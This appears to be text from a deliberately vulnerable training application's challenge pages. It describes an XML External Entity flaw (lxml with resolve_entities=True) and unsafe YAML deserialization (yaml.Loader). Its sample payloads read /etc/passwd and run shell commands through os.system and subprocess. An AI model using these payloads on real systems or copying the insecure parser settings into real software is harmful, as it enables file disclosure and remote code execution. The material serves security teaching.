XML Config Import P1 · XXE

Upload a reactor configuration XML. The server parses it with lxml.etree.XMLParser(resolve_entities=True) — external entities are resolved, reading files from the server filesystem.


    

    

      
XXE attack structure:

      
<?xml version="1.0"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<reactor-config>
  <name>&xxe;</name>
  <core-temp>9182</core-temp>
</reactor-config>

      
CWE-611 · XML External Entity · lxml resolve_entities=True

    

  







  
YAML Config Import P1 · Unsafe YAML Load

  

    

      
Reactor parameters can be loaded from YAML. The parser uses yaml.Loader (not SafeLoader) enabling arbitrary Python object instantiation.

      
      

        
        
        
      

      

    

    

      
# Safe (yaml.SafeLoader):
core_temp: 9182

# Malicious (yaml.Loader allows !!python/object):
!!python/object/apply:os.system
- "id > /tmp/pwned.txt"

# Or: instantiate subprocess
!!python/object/apply:subprocess.check_output
- ["id"]

      
CWE-502 · Deserialization of Untrusted Data
